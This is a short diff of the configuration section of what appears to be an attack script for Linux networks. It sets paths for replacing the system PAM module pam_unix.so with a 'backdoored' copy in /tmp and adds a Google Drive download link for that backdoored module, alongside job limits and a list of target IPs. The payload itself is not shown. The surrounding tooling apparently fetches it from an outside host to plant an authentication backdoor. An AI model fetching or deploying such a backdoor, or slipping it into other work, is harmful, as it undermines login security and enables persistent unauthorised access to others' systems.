@@ -7,7 +7,7 @@ timeout=5
 max_jobs=10
 path_to_pam="/lib/x86_64-linux-gnu/security/pam_unix.so"
 path_to_backdoored_pam="/tmp/pam_unix.so"
-link_to_backdoored_pam=""
+link_to_backdoored_pam="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"
 
 IPs=()
 network_id="1.1"
